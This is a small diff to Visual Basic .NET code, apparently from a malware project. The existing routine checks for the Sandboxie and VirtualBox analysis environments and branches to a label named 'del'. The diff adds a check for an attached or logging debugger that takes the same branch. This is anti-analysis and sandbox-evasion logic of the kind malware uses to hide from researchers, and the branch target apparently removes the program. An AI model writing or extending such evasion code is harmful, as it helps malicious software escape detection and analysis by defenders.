@@ -19,8 +19,12 @@
                 ElseIf LoadLibrary("SbieDll.dll") = True Then
                     GoTo del
 
+                ElseIf Diagnostics.Debugger.IsLogging OrElse Diagnostics.Debugger.IsAttached Then
+                    GoTo del
+
                 ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxhook.dll") Then
                     GoTo del
+
                 End If
                 Exit Sub
 del:
